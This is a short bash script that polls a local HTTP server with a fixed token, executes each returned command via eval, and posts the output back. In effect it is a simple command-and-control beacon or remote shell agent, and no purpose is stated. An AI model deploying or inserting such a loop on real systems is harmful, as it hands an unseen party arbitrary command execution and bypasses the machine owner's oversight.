#!/bin/bash

URL="http://localhost:8889"
TOKEN="123token123"

while :
do
  echo "Get commands.. $TOKEN"
  response=$(curl -s -w "%{http_code}" -X 'GET' "$URL/api/get-commands/$TOKEN" -H 'accept: */*')
  http_code=${response: -3}  # get the last line
  content=$(echo "${response}" | head -c-4)   # get all but the last line which contains the status code
  echo "< [$http_code] $content"
  if [ "$http_code" == "200" ];then
    if [ "$content" != "" ];then
      output=$(eval "$content")
      echo "> $output"
      curl -s -X 'POST' "$URL/api/send-result/$TOKEN" -H 'accept: */*' -H 'Content-Type: application/json' -d "$output"
    fi
  else
    echo "Empty response.. sleep 1m"
    sleep 1m
  fi
done